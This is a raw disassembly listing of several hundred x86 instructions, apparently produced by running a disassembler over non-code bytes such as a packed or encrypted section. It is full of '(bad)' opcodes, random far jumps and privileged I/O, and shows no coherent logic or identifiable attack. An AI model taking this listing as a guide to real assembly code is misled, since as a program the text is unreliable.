  41924f:	unpckhps xmm6,XMMWORD PTR [eiz*8+0xb716737]
  419257:	push   es
  419258:	adc    al,0x6f
  41925a:	pop    edi
  41925b:	retf   
  41925c:	push   es
  41925d:	pop    eax
  41925e:	jmp    0x8f4e7e20
  419263:	mov    WORD PTR [esi+0x1b9f6be6],fs
  419269:	jmp    0x190b:0xa92e0c86
  419270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419271:	fsubp  st(5),st
  419273:	mov    eax,0x772ccdaf
  419278:	jo     0x41920f
  41927a:	inc    esp
  41927b:	into   
  41927c:	in     eax,dx
  41927d:	pop    esi
  41927e:	lds    esi,FWORD PTR [eax+0x25e5b913]
  419284:	jge    0x419224
  419286:	sub    DWORD PTR ds:0xb9f9b197,ecx
  41928c:	sub    ch,BYTE PTR [edx]
  41928e:	adc    al,0x8f
  419290:	or     dl,BYTE PTR [edx]
  419292:	pop    edx
  419293:	movntps XMMWORD PTR [ebp-0x19],xmm2
  419297:	cwde   
  419298:	add    BYTE PTR [ecx+0x2a4a0abc],ch
  41929e:	mov    fs,eax
  4192a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192a1:	repz pop ecx
  4192a3:	loope  0x41927d
  4192a5:	test   DWORD PTR [eax+0x31],ecx
  4192a8:	call   0x417e:0xa5836f7
  4192af:	pushf  
  4192b0:	mov    bh,ah
  4192b2:	ds ins BYTE PTR es:[edi],dx
  4192b4:	adc    BYTE PTR [eax-0x80],ah
  4192b7:	mov    bh,0x3a
  4192b9:	pop    si
  4192bb:	jecxz  0x41925a
  4192bd:	mov    dh,0x3e
  4192bf:	sub    al,0x9
  4192c1:	es aam 0xc5
  4192c4:	gs pop ebx
  4192c6:	push   ebx
  4192c7:	jmp    0xe4f74669
  4192cc:	xor    BYTE PTR [ebx+0x4cd5aec4],al
  4192d2:	xor    dh,BYTE PTR ds:0xcffc8342
  4192d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d9:	xchg   ebp,eax
  4192da:	cwde   
  4192db:	je     0x41929a
  4192dd:	push   edx
  4192de:	lds    esp,FWORD PTR [edx]
  4192e0:	jns    0x419262
  4192e2:	and    al,0xf4
  4192e4:	int    0xc5
  4192e6:	lock js 0x419302
  4192e9:	ss dec eax
  4192eb:	mov    bh,0xa5
  4192ed:	dec    edi
  4192ee:	or     ebx,ebp
  4192f0:	xlat   BYTE PTR ds:[ebx]
  4192f1:	sbb    ecx,DWORD PTR [ebx-0x513f20c7]
  4192f7:	call   0xcf79a39c
  4192fc:	mov    ebx,0x5b2b1073
  419301:	stc    
  419302:	dec    ebx
  419303:	xlat   BYTE PTR ds:[ebx]
  419304:	pop    eax
  419305:	ins    BYTE PTR es:[edi],dx
  419306:	dec    esp
  419307:	mov    bl,0x42
  419309:	cwde   
  41930a:	or     eax,0x7b10c79f
  41930f:	enter  0x334b,0x5d
  419313:	popf   
  419314:	icebp  
  419315:	dec    ebx
  419316:	xchg   edx,eax
  419317:	mov    dh,0x4d
  419319:	cmp    eax,0x87f2f9dc
  41931e:	mov    dl,0xc8
  419320:	mov    DWORD PTR [ebx-0x3e],edi
  419323:	test   BYTE PTR [esi+0x7a],al
  419326:	cmp    DWORD PTR ds:0xa8f8a7,ecx
  41932c:	(bad)  
  41932e:	cmp    BYTE PTR [ebp+0x25fe950f],ah
  419334:	shr    DWORD PTR [edx-0x44c542bf],1
  41933a:	sub    BYTE PTR [ebp-0x2b],al
  41933d:	fild   DWORD PTR [ecx-0x3e3ddafe]
  419343:	mov    ebp,0xa0889095
  419348:	xor    dl,BYTE PTR [ebp+0x66d6dc03]
  41934e:	out    dx,eax
  41934f:	(bad)  
  419350:	mov    bl,0xed
  419352:	jecxz  0x419387
  419354:	push   ss
  419355:	cmp    DWORD PTR [edx+0x2e],esi
  419358:	out    dx,al
  419359:	sbb    BYTE PTR [esi-0x42df53f1],ch
  41935f:	mov    edx,0x997787e0
  419364:	mov    esi,0xb4205bf7
  419369:	or     al,0xb7
  41936b:	inc    ebp
  41936c:	pop    eax
  41936d:	fcomip st,st(4)
  41936f:	ffreep st(2)
  419371:	or     DWORD PTR [ebx],ebp
  419373:	call   0x184a:0x1346bfda
  41937a:	or     BYTE PTR [eax+0x2857cf11],dl
  419380:	jecxz  0x4193b0
  419382:	fld    TBYTE PTR [ecx+0x24]
  419385:	fwait
  419386:	sar    DWORD PTR [edi-0xd81fde9],0xfa
  41938d:	xor    cl,dh
  41938f:	(bad)  
  419391:	ror    BYTE PTR [ebx+0x25],cl
  419394:	fsubrp st(4),st
  419396:	dec    ebx
  419397:	hlt    
  419398:	sub    cl,BYTE PTR [ebp-0x1af943d1]
  41939e:	inc    esp
  41939f:	pop    es
  4193a0:	inc    BYTE PTR [ecx-0x5a09bd42]
  4193a6:	fdiv   DWORD PTR [eax+0x23]
  4193a9:	cli    
  4193aa:	or     BYTE PTR [edi-0x40840a04],bh
  4193b0:	mov    DWORD PTR [edi],0x54ef514b
  4193b6:	sub    ah,BYTE PTR [esi+0x5f]
  4193b9:	add    DWORD PTR [ebp-0x20],ecx
  4193bc:	loope  0x41940f
  4193be:	pop    edi
  4193bf:	xchg   ebx,eax
  4193c0:	imul   eax,ecx,0xb511913b
  4193c6:	dec    ecx
  4193c7:	cld    
  4193c8:	jmp    0x69013f07
  4193cd:	in     eax,dx
  4193ce:	rcl    DWORD PTR [ebp-0x7098c830],0x29
  4193d5:	and    DWORD PTR [esi-0x7a534719],edx
  4193db:	inc    ecx
  4193dc:	fcom   QWORD PTR [edi+0x6f]
  4193df:	inc    esi
  4193e0:	fwait
  4193e1:	test   eax,0x3567c7f1
  4193e6:	pushf  
  4193e7:	sub    al,0xb8
  4193e9:	loopne 0x4193c5
  4193eb:	pop    es
  4193ec:	adc    DWORD PTR [ebp*2+0x51527d70],ebx
  4193f3:	mov    ?,ebp
  4193f5:	cmp    BYTE PTR [ebx-0x22],bl
  4193f8:	and    DWORD PTR [esi+0x6f7ed524],0x4359bc43
  419402:	xchg   ebp,eax
  419403:	(bad)  
  419404:	pop    eax
  419405:	xchg   esi,eax
  419406:	outs   dx,DWORD PTR ds:[esi]
  419407:	and    al,0x4b
  419409:	add    al,0x8
  41940b:	dec    edi
  41940c:	repz pop esp
  41940e:	test   al,0xff
  419410:	push   eax
  419411:	jnp    0x419448
  419413:	cs stc 
  419415:	mov    ds:0x2147f66,al
  41941a:	adc    DWORD PTR [ebp+0x59],eax
  41941d:	mov    bh,0x7d
  41941f:	loop   0x419429
  419421:	dec    eax
  419422:	popa   
  419423:	iret   
  419424:	mov    al,ds:0x79ae8458
  419429:	(bad)  
  41942a:	mov    cs,edi
  41942c:	pop    edx
  41942d:	scas   eax,DWORD PTR es:[edi]
  41942e:	cli    
  41942f:	fwait
  419430:	ins    BYTE PTR es:[edi],dx
  419431:	fsub   st,st(7)
  419433:	arpl   WORD PTR [eax],cx
  419435:	dec    edx
  419436:	pop    ds
  419437:	les    ebx,FWORD PTR [eax]
  419439:	xchg   BYTE PTR [ecx-0x296640e6],ah
  41943f:	pop    esp
  419440:	into   
  419441:	add    BYTE PTR ds:0x2e4560e5,0x5c
  419448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419449:	jo     0x419435
  41944b:	test   DWORD PTR [ecx],esi
  41944d:	mov    edx,0xed53b0b0
  419452:	xchg   DWORD PTR [ecx],ebx
  419454:	into   
  419455:	sbb    edi,ebp
  419457:	jbe    0x419431
  419459:	mov    eax,ds:0x59897114
  41945e:	inc    esi
  41945f:	call   0x852deae4
  419464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419465:	add    esp,DWORD PTR [ecx+0x1]
  419468:	xchg   DWORD PTR [esi],ebp
  41946a:	stos   BYTE PTR es:[edi],al
  41946b:	pop    ds
  41946c:	ret    
  41946d:	and    edx,DWORD PTR [edx+ebp*1-0x49]
  419471:	call   0x3adabe00
  419476:	push   0x12
  419478:	sub    al,BYTE PTR [esi+0x4f]
  41947b:	ins    DWORD PTR es:[edi],dx
  41947c:	pop    edx
  41947d:	je     0x419411
  41947f:	inc    eax
  419480:	inc    esi
  419481:	les    ebp,FWORD PTR [esi-0x7c]
  419484:	xor    BYTE PTR [edx+eax*8+0x50],0x4a
  419489:	xor    BYTE PTR [esi+0xae88ebd],ch
  41948f:	mov    ah,0x11
  419491:	jns    0x41947d
  419493:	sti    
  419494:	repnz xor eax,0x3936df8f
  41949a:	pop    ebp
  41949b:	jle    0x419422
  41949d:	js     0x41945c
  41949f:	gs add eax,0xbc6390dd
  4194a5:	push   ebx
  4194a6:	and    dl,BYTE PTR ds:0xb202a2ab
  4194ac:	jle    0x419477
  4194ae:	jge    0x4194cb
  4194b0:	test   DWORD PTR [eax],ebx
  4194b2:	mov    ch,0xac
  4194b4:	mov    ecx,0xfad43d2
  4194b9:	ficom  WORD PTR [eax+0x3f]
  4194bc:	repz mov es,ebp
  4194bf:	loop   0x4194fc
  4194c1:	adc    DWORD PTR [ebx+0x1d],esi
  4194c4:	mov    ds:0x8f273715,al
  4194c9:	dec    eax
  4194ca:	mov    es,WORD PTR [edi+0x7cd78c19]
  4194d0:	test   edi,esi
  4194d2:	mov    dh,0x18
  4194d4:	inc    esi
  4194d5:	in     eax,0x84
  4194d7:	and    BYTE PTR [edx-0x5a],al
  4194da:	jmp    0x95aa:0x517fb623
  4194e1:	or     DWORD PTR [ebx+eiz*8-0x2a],0x5bd40230
  4194e9:	jg     0x41949a
  4194eb:	mov    al,ds:0x15ecddf8
  4194f0:	inc    edx
  4194f1:	sti    
  4194f2:	sar    dl,0x47
  4194f5:	fsubrp st(2),st
  4194f7:	xor    eax,0x7bbc38c3
  4194fc:	sub    esp,DWORD PTR [edx-0x1adfcd19]
  419502:	inc    eax
  419503:	aad    0xb6
  419505:	mov    ah,0xa3
  419507:	cmp    DWORD PTR [edi-0x61630eda],0x451446f5
  419511:	add    BYTE PTR [ebp-0x16],dl
  419514:	mov    ds:0x7f2414b5,al
  419519:	pop    eax
  41951a:	neg    BYTE PTR [edi-0x560d31df]
  419520:	loope  0x419505
  419522:	dec    ebx
  419523:	push   ss
  419524:	cmp    al,0xd2
  419526:	pop    edx
  419527:	stc    
  419528:	out    dx,eax
  419529:	(bad)  
  41952b:	into   
  41952c:	bound  esp,QWORD PTR [eax+eax*4+0x2dc44a9b]
  419533:	shl    bl,0x7c
  419536:	(bad)  ds:0x80fbb8c
  41953c:	(bad)  [edi+0x581cb166]
  419542:	lds    edx,FWORD PTR [edx-0x6131a403]
  419548:	popa   
  419549:	stos   DWORD PTR es:[edi],eax
  41954a:	outs   dx,DWORD PTR ds:[esi]
  41954b:	cmp    BYTE PTR [ebx-0x53],bh
  41954e:	mov    al,ds:0xeb38db5b
  419553:	dec    esi
  419554:	xor    al,0x1c
  419556:	bound  eax,QWORD PTR [ebp-0x2240a191]
  41955c:	ror    DWORD PTR ds:0x671d99f2,cl
  419562:	push   ebp
  419563:	cs push cs
  419565:	cmc    
  419566:	pop    ecx
  419567:	test   BYTE PTR [eax-0x6b],ah
  41956a:	outs   dx,DWORD PTR ds:[esi]
  41956b:	mov    al,0x4f
  41956d:	test   eax,0x52aa31d5
  419572:	adc    eax,0xc2bb46d2
  419577:	xchg   esp,eax
  419578:	cmc    
  419579:	dec    ebx
  41957a:	add    cl,bl
  41957c:	fwait
  41957d:	ins    BYTE PTR es:[edi],dx
  41957e:	(bad)  
  41957f:	jg     0x419501
  419581:	mov    WORD PTR [eax],?
  419583:	mov    ebp,0x781fae7c
  419588:	jbe    0x419550
  41958a:	jmp    0x2e57:0x326d511f
  419591:	cdq    
  419592:	jl     0x4195b6
  419594:	std    
  419595:	mov    dl,0xc6
  419597:	test   eax,0x9b95d887
  41959c:	enter  0xd550,0xbe
  4195a0:	jns    0x4195fd
  4195a2:	sar    DWORD PTR [ecx],0x43
  4195a5:	inc    esp
  4195a6:	adc    al,0x54
  4195a8:	lahf   
  4195a9:	test   BYTE PTR [eax-0x7d],al
  4195ac:	(bad)  
  4195ad:	cmp    BYTE PTR [ecx+0x2a4ff6c7],bl
  4195b3:	(bad)  
  4195b4:	stos   BYTE PTR es:[edi],al
  4195b5:	sub    ebp,DWORD PTR [esi]
  4195b7:	pop    esp
  4195b8:	or     DWORD PTR [edx-0x5d],ecx
  4195bb:	lods   eax,DWORD PTR ds:[esi]
  4195bc:	cmp    al,0xaf
  4195be:	push   esi
  4195bf:	sub    ebx,ebx
  4195c1:	scas   al,BYTE PTR es:[edi]
  4195c2:	push   0x57
  4195c4:	pop    ds
  4195c5:	(bad)  
  4195c6:	or     eax,0xa97f421f
  4195cb:	pushf  
  4195cc:	adc    dl,BYTE PTR [esp+ecx*8]
  4195cf:	sub    ecx,edi
  4195d1:	or     al,0x6
  4195d3:	mov    ebx,DWORD PTR [esi-0x6bbf03c5]
  4195d9:	jle    0x419569
  4195db:	mov    DWORD PTR [esp+ecx*1+0x2b],edi
  4195df:	cmp    eax,0x71d23b
  4195e4:	arpl   WORD PTR [edx-0x4c],bp
  4195e7:	out    dx,eax
  4195e8:	bound  eax,QWORD PTR [ebx+0x54]
  4195eb:	adc    edx,ecx
  4195ed:	ins    DWORD PTR es:[edi],dx
  4195ee:	dec    esi
  4195ef:	jnp    0x4195e0
  4195f1:	lds    esp,FWORD PTR [esi]
  4195f3:	pop    ds
  4195f4:	adc    dh,dl
  4195f6:	jp     0x41959f
  4195f8:	cmovs  ebp,DWORD PTR [eax+0x15]
  4195fc:	int    0xb4
  4195fe:	fs jne 0x419629
  419601:	and    BYTE PTR [edi-0x76e60e45],0x47
  419608:	stc    
  419609:	sbb    esi,DWORD PTR [esi+eax*8-0x71cfb314]
  419610:	out    dx,eax
  419611:	mov    eax,0x9cc3a523
  419616:	or     DWORD PTR [esi+eiz*8],ecx
  419619:	aaa    
  41961a:	mov    eax,0x55dc62f8
  41961f:	call   0x5ab1bb1c
  419624:	jp     0x41962e
  419626:	mov    ebp,DWORD PTR [edx-0x30]
  419629:	retf   
  41962a:	ret    0xc007
  41962d:	in     eax,0x65
  41962f:	dec    esp
  419630:	adc    BYTE PTR ds:[ebx],bh
  419633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419635:	mov    cl,0x10
  419637:	aaa    
  419638:	cmp    bh,dh
  41963a:	enter  0x6640,0x88
  41963e:	xor    eax,0xa82ccbb
  419643:	cld    
  419644:	cwde   
  419645:	lods   eax,DWORD PTR ds:[esi]
  419646:	dec    edi
  419647:	or     ch,BYTE PTR [ecx-0x6c]
  41964a:	mov    ds:0xbc5e8efd,eax
  41964f:	adc    ch,ch
  419651:	push   ebx
  419652:	push   0x17
  419654:	jbe    0x419693
  419656:	jne    0x4195dd
  419658:	fmul   DWORD PTR [esi]
  41965a:	call   0xa045:0xe11fa80
  419661:	xor    DWORD PTR [esi],ebx
  419663:	(bad)  
  419664:	ss pop esi
  419666:	out    dx,al
  419667:	sbb    ah,BYTE PTR [eax+edi*8]
  41966a:	test   eax,0xb7eab405
  41966f:	out    dx,al
  419670:	sbb    DWORD PTR [ebp+0x4444db15],ebx
  419676:	shr    DWORD PTR [esi+eax*1+0x4e0d3812],cl
  41967d:	into   
  41967e:	aaa    
  41967f:	fs mov eax,0xd8108960
  419685:	sbb    BYTE PTR [edx],bl
  419687:	sar    esp,0x4a
  41968a:	das    
  41968b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41968c:	shl    BYTE PTR [ecx-0x570f149a],1
  419692:	mov    edx,0xe3829ae6
  419697:	dec    edi
  419698:	daa    
  419699:	inc    edi
  41969a:	xor    eax,0xc92b4e9e
  41969f:	mov    ebx,0x1f7e510e
  4196a4:	retf   0xd382
  4196a7:	mov    eax,ds:0xfeba9fac
  4196ac:	push   edi
  4196ad:	test   eax,0xfb33bf5b
  4196b2:	xor    BYTE PTR [eax],ch
  4196b4:	xchg   edx,eax
  4196b5:	pop    ds
  4196b6:	lock or eax,0xb9b74a49
  4196bc:	ror    DWORD PTR [ecx+0x1f],cl
  4196bf:	mov    ds:0x6c32ca51,al
  4196c4:	jge    0x4196ba
  4196c6:	(bad)  
  4196c7:	js     0x4196d0
  4196c9:	or     bl,BYTE PTR ds:0x76bf78ad
  4196cf:	fsub   st(2),st
  4196d1:	in     eax,dx
  4196d2:	push   esi
  4196d3:	aam    0xcf
  4196d5:	push   edx
  4196d6:	test   BYTE PTR [edi+edx*8-0x28],dh
  4196da:	aam    0xa6
  4196dc:	cli    
  4196dd:	push   0xffffffd8
  4196df:	push   edx
  4196e0:	(bad)  [esi]
  4196e2:	jge    0x4196cf
  4196e4:	ret    0xd0fd
  4196e7:	push   esp
  4196e8:	sbb    ah,BYTE PTR [ebx]
  4196ea:	jb     0x419677
  4196ec:	adc    BYTE PTR [edi+0x6c],dl
  4196ef:	push   ds
  4196f0:	fcom   QWORD PTR [eax]
  4196f2:	xchg   ebp,eax
  4196f3:	mov    ecx,0x4d63542f
  4196f8:	dec    ebx
  4196f9:	push   ss
  4196fa:	shl    BYTE PTR [ecx-0x29],0xad
  4196fe:	add    DWORD PTR [esi+0x50],ebx
  419701:	xor    eax,0x4c1cca7e
  419706:	mov    WORD PTR [edx+0x212fb308],gs
  41970c:	sub    eax,0xaf5ea09e
  419711:	and    dh,BYTE PTR [ecx-0x65]
  419714:	xchg   esp,eax
  419715:	jmp    FWORD PTR [ebp+0x71]
  419718:	push   ebp
  419719:	nop
  41971a:	add    al,0xde
  41971c:	dec    edi
  41971d:	ins    DWORD PTR es:[edi],dx
  41971e:	cmp    ebx,DWORD PTR [eax+0x2f90cbc3]
  419724:	mov    edi,0x7a76b563
  419729:	aaa    
  41972a:	push   ds
  41972b:	fs sub eax,0xde920cfb
  419731:	mov    WORD PTR [ebp-0x208f4590],es
  419737:	jl     0x419790
  419739:	idiv   DWORD PTR [ebx-0x1e4bb53f]
  41973f:	fs and eax,0xcc1e221c
  419745:	cmp    al,0xb6
  419747:	or     ebx,esp
  419749:	repz sub eax,0x2144ebb7
  41974f:	data16 addr16 jno 0x4196f5
  419753:	test   BYTE PTR [eax-0x43],dl
  419756:	dec    esi
  419757:	gs ins DWORD PTR es:[edi],dx
  419759:	jae    0x4197ad
  41975b:	mov    ch,0xd8
  41975d:	xchg   edx,eax
  41975e:	pushf  
  41975f:	js     0x41979d
  419761:	pop    ebp
  419762:	mov    eax,ds:0xf5ef301e
  419767:	adc    al,0xd4
  419769:	or     eax,DWORD PTR [ebx+0x4b49a0d1]
  41976f:	nop
  419770:	xabort 0xbe
  419773:	inc    ebx
  419774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419775:	dec    edi
  419776:	ror    DWORD PTR [esi],0x8d
  419779:	mov    cl,dl
  41977b:	(bad)  
  41977c:	in     al,dx
  41977d:	in     al,0x4e
  41977f:	dec    edx
  419780:	in     al,dx
  419781:	aas    
  419782:	lods   al,BYTE PTR ds:[esi]
  419783:	es aad 0xd3
  419786:	push   0x7971d05d
  41978b:	sub    DWORD PTR [ebx-0x57],edx
  41978e:	sub    dh,BYTE PTR [eax+0x13]
  419791:	sbb    DWORD PTR [esi],ebx
  419793:	push   ss
  419794:	inc    ebx
  419795:	mov    ch,0xfc
  419797:	rol    DWORD PTR [ebp+0x35],cl
  41979a:	xor    al,0x36
  41979c:	pop    ecx
  41979d:	arpl   WORD PTR ds:0x3e82686b,si
  4197a3:	jns    0x41977f
  4197a5:	mov    edi,0x490877f9
  4197aa:	mov    ds:0xcf879206,eax
  4197af:	lods   eax,DWORD PTR ds:[esi]
  4197b0:	add    dl,dl
  4197b2:	inc    esp
  4197b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197b4:	push   0x3fc5845a
  4197b9:	test   eax,0x37e98681
  4197be:	and    ch,BYTE PTR [edx]
  4197c0:	inc    ebx
  4197c1:	add    bl,BYTE PTR [edi-0x42]
  4197c4:	mov    eax,ds:0xc1979ea0
  4197c9:	ret    0xe1ed
  4197cc:	hlt    
  4197cd:	jge    0x419842
  4197cf:	inc    esp
  4197d0:	xor    eax,0x124ff5f1
  4197d5:	mov    edx,0x8344c791
  4197da:	in     al,0x79
  4197dc:	out    dx,al
  4197dd:	jnp    0x4197ae
  4197df:	clc    
  4197e0:	push   ebx
  4197e1:	cld    
  4197e2:	fs je  0x4197b8
  4197e5:	xchg   ebx,eax
  4197e6:	iret   
  4197e7:	xchg   edi,eax
  4197e8:	inc    edi
  4197e9:	(bad)  
  4197ea:	mov    BYTE PTR [ebx+eiz*8-0x20c56912],bl
  4197f1:	sub    al,0x16
  4197f3:	jg     0x41983f
  4197f5:	cli    
  4197f6:	pop    ebx
  4197f7:	dec    esp
  4197f8:	test   eax,0x87e27fec
  4197fd:	and    DWORD PTR [edi],eax
  4197ff:	xchg   BYTE PTR [ebx-0x10],al
  419802:	mov    BYTE PTR [ebp-0xf],ah
  419805:	inc    esp
  419806:	dec    esp
  419807:	neg    al
  419809:	ret    
  41980a:	xlat   BYTE PTR ds:[ebx]
  41980b:	push   cs
  41980c:	xor    BYTE PTR es:[esi+0x31],ah
  419810:	dec    esp
  419811:	xlat   BYTE PTR ds:[ebx]
  419812:	inc    ecx
  419813:	pop    ebx
  419814:	call   DWORD PTR [edx-0x38]
  419817:	ret    0xe9c9
  41981a:	add    eax,0x9b5c8a32
  41981f:	lods   eax,DWORD PTR ds:[esi]
  419820:	les    edi,FWORD PTR [edx]
  419822:	in     eax,dx
  419823:	and    al,0xc7
  419825:	clc    
  419826:	repz sbb DWORD PTR [esi-0x4a],0x8a70762c
  41982e:	push   es
  41982f:	add    al,0xb0
  419831:	into   
  419832:	mov    esi,0x69161d
  419837:	lods   al,BYTE PTR ds:[esi]
  419838:	sub    bl,BYTE PTR [ebx+0x33]
  41983b:	push   esp
  41983c:	mov    al,BYTE PTR [ebx]
  41983e:	cmp    eax,0x4ae92def
  419843:	mov    esp,0xc2a51f08
  419848:	out    0xa1,eax
  41984a:	jg     0x419860
  41984c:	sub    eax,0x2c6db884
  419851:	pop    edx
  419852:	inc    ecx
  419853:	aas    
  419854:	xchg   BYTE PTR [ebx+0x2e5562f6],bh
  41985a:	loop   0x41982a
  41985c:	(bad)  
  41985d:	mov    cl,0x56
  41985f:	add    ah,bh
  419861:	scas   eax,DWORD PTR es:[edi]
  419862:	pop    ss
  419863:	mov    ah,0x1a
  419865:	push   ss
  419866:	data16 (bad) 
  419868:	xor    BYTE PTR [eiz*4+0x1c372ce9],ch
  41986f:	cld    
  419870:	pop    ds
  419871:	scas   eax,DWORD PTR es:[edi]
  419872:	bound  eax,QWORD PTR [edx+0x7a]
  419875:	rcr    BYTE PTR [edx-0x3e0056b7],1
  41987b:	fcomp  QWORD PTR [ebx-0xbbe4a79]
  419881:	cmp    ebp,DWORD PTR [edi]
  419883:	add    BYTE PTR [ebp+0x7c],ah
  419886:	jge    0x419809
  419888:	mov    dl,0xe8
  41988a:	dec    ebx
  41988b:	test   DWORD PTR [ecx+0x0],0xf30e90ec
  419892:	cmp    BYTE PTR [esi+ebx*1+0x57a14a4b],ch
  419899:	iret   
  41989a:	icebp  
  41989b:	idiv   edi
  41989d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41989f:	cmp    al,0xec
  4198a1:	fisttp WORD PTR [ecx+edx*1-0x17]
  4198a5:	push   esi
  4198a6:	(bad)
  4198a9:	cmp    dh,BYTE PTR [ebx+0x0]
  4198ac:	add    al,0x82
  4198ae:	inc    ecx
  4198af:	hlt    
  4198b0:	sti    
  4198b1:	jle    0x419899
  4198b3:	mov    bh,0xbe
  4198b5:	jnp    0x4198ae
  4198b7:	dec    edi
  4198b8:	je     0x4198ad
  4198ba:	mov    al,ds:0x26a5aff
  4198bf:	mov    ebp,0xf6f42442
  4198c4:	dec    ebp
  4198c5:	or     esi,DWORD PTR [eax+0x720061d3]
  4198cb:	mov    ds:0x50309071,eax
  4198d0:	inc    esi
  4198d1:	mov    cl,0x45
  4198d3:	(bad)  
  4198d5:	aas    
  4198d6:	mov    ah,0xf4
  4198d8:	leave  
  4198d9:	and    DWORD PTR [eax],0x63
  4198dc:	dec    edx
  4198dd:	push   ecx
  4198de:	imul   edi,DWORD PTR [edx+0x3e42150b],0x2c
  4198e5:	sub    dl,BYTE PTR [ebx+esi*1+0x4e]
  4198e9:	test   al,0xae
  4198eb:	sbb    edx,ebx
  4198ed:	cmp    eax,0x45cc95e8
  4198f2:	dec    ebx
  4198f3:	lea    esi,[ecx-0x3a74aeb5]
  4198f9:	push   ecx
  4198fa:	cmp    al,0x81
  4198fc:	xor    bh,BYTE PTR [ebx+edi*4-0xc9084d1]
  419903:	pop    ecx
  419904:	shr    DWORD PTR [ebx],cl
  419906:	jmp    0x205f:0x67b9eefa
  41990d:	pushf  
  41990e:	or     eax,0xf298d214
  419913:	pushf  
  419914:	call   0xaad74f08
  419919:	cld    
  41991a:	sub    al,0xf
  41991c:	iret   
  41991d:	outs   dx,DWORD PTR ds:[esi]
  41991e:	in     eax,dx
  41991f:	dec    eax
  419920:	pop    edx
  419921:	les    ebp,FWORD PTR [ebx+esi*2-0x56da2e0]
  419928:	add    al,0xc1
  41992a:	call   DWORD PTR [ecx+0x1d00dff]
  419930:	sbb    al,0x2f
  419932:	dec    ebx
  419933:	pop    edi
  419934:	adc    dh,bl
  419936:	fcmove st,st(0)
  419938:	xchg   BYTE PTR [edx+0x0],dl
  41993b:	outs   dx,DWORD PTR ds:[esi]
  41993c:	jge    0x41999a
  41993e:	adc    DWORD PTR [eax],edx
  419940:	cmp    cl,bl
  419942:	dec    eax
  419943:	cdq    
  419944:	xor    bl,BYTE PTR [ebx]
  419946:	push   ebx
  419947:	or     ch,al
  419949:	mov    edx,0x28bc8785
  41994e:	xchg   esi,eax
  41994f:	inc    edi
  419950:	js     0x419986
  419952:	xchg   edx,eax
  419953:	test   edi,ecx
  419955:	out    dx,eax
  419956:	mov    bh,0x56
  419958:	rdpmc  
  41995a:	stc    
  41995b:	mov    bh,0x7b
  41995d:	sbb    DWORD PTR [ebx+0x7a17bf49],esi
  419963:	jb     0x4199e0
  419965:	dec    ecx
  419966:	pop    edi
  419967:	in     al,0x64
  419969:	xlat   BYTE PTR ds:[ebx]
  41996a:	cmc    
  41996b:	inc    esi
  41996c:	or     eax,0xe12b5ddd
  419971:	cmp    dl,BYTE PTR [edx]
  419973:	pushf  
  419974:	retf   
  419975:	push   ss
  419976:	cli    
  419977:	in     al,dx
  419978:	cwde   
  419979:	pusha  
  41997a:	dec    edx
  41997b:	sbb    BYTE PTR [eax+0x27d75ba1],ch
  419981:	aad    0x62
  419983:	repz loop 0x41997d
  419986:	lods   eax,DWORD PTR ds:[esi]
  419987:	xchg   edi,eax
  419988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419989:	xor    eax,ecx
  41998b:	cmc    
  41998c:	loope  0x4199cb
  41998e:	ret    
  41998f:	ret    0x10f0
  419992:	and    al,0x14
  419994:	cld    
  419995:	pushf  
  419996:	jne    0x419945
  419998:	shl    BYTE PTR [esp+esi*4-0x14e03bd0],1
  41999f:	push   ds
  4199a0:	cmp    eax,0x86af6a79
  4199a5:	xlat   BYTE PTR ds:[ebx]
  4199a6:	dec    ecx
  4199a7:	(bad)  
  4199a9:	mov    bh,0xad
  4199ab:	push   esp
  4199ac:	sar    al,0xce
  4199af:	fwait
  4199b0:	jle    0x4199a8
  4199b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199b3:	(bad)  
  4199b4:	loopne 0x4199b3
  4199b6:	cs sub eax,0x2470cc8a
  4199bc:	fabs   
  4199be:	and    ebp,edx
  4199c0:	cld    
  4199c1:	xchg   DWORD PTR [ebp+edx*8+0x7d],ecx
  4199c5:	js     0x41995f
  4199c7:	mov    edi,0xa4477f57
  4199cc:	gs (bad) 
  4199ce:	add    dh,BYTE PTR [edi-0x6137d3f8]
  4199d4:	inc    eax
  4199d5:	jle    0x419a29
  4199d7:	ror    edi,1
  4199d9:	inc    eax
  4199da:	fst    QWORD PTR [ebx]
  4199dc:	or     dl,0x7e
  4199df:	jns    0x4199f8
  4199e1:	pop    ebp
  4199e2:	ins    DWORD PTR es:[edi],dx
  4199e3:	inc    ebx
  4199e4:	pop    ebx
  4199e5:	mov    edx,0x6e523b64
  4199ea:	pop    es
  4199eb:	sub    eax,0xc8ffe72f
  4199f0:	jno    0x4199d6
  4199f2:	fimul  WORD PTR [edx-0x6b82ca95]
  4199f8:	retf   
  4199f9:	cmp    DWORD PTR ds:0x98b66a2a,0x3567d840
  419a03:	scas   eax,DWORD PTR es:[edi]
  419a04:	jl     0x419a14
  419a06:	mov    al,ds:0xc0dd5d23
  419a0b:	push   eax
  419a0c:	pop    es
  419a0d:	loope  0x4199a8
  419a0f:	adc    DWORD PTR [eax],ecx
  419a11:	(bad)  [esi-0x74bfc6a9]
  419a17:	imul   esp,DWORD PTR [eax-0x32],0x46f547f8
  419a1e:	call   0x10c3945
  419a23:	cdq    
  419a24:	mov    al,ds:0xdac39482
  419a29:	cmp    BYTE PTR [eax-0x30540ef2],0xcd
  419a30:	shl    BYTE PTR [esi],0x94
  419a33:	popa   
  419a34:	stos   DWORD PTR es:[edi],eax
  419a35:	out    dx,eax
  419a36:	adc    al,BYTE PTR [edi+0x75]
  419a39:	repz pop ds
  419a3b:	fld    TBYTE PTR [eax]
  419a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a3e:	cmp    BYTE PTR [edx],0x67
  419a41:	icebp  
  419a42:	ret    0x514
  419a45:	and    dl,bl
  419a47:	cmc    
  419a48:	mov    dl,0xc
